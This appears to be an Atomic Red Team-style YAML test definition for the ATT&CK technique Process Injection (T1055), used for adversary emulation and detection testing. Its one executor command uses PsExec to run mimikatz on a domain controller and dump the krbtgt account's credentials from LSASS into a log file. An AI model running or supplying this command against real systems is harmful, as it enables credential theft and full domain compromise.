attack_technique: T1055
display_name: Process Injection
atomic_tests:
- name: Process Injection via mimikatz
  description: |
    Use mimikatz to retrieve lsass process content via injection of a dll
  supported_platforms:
  - windows
  input_arguments:
    mimikatz_path:
      description: mimikatz windows executable
      type: Path
      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.exe
    psexec_path:
      description: psexec windows executable
      type: Path
      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\PsExec.exe
    account:
      description: Account to impersonate
      type: string
      default: krbtgt
    machine:
      description: machine to target
      type: string
      default: DC1
    output_file:
      description: Output file
      type: path
      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.log
  executor:
    command: |
      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /name:#{account}" "exit" > #{output_file}
    name: powershell
    elevation_required: true
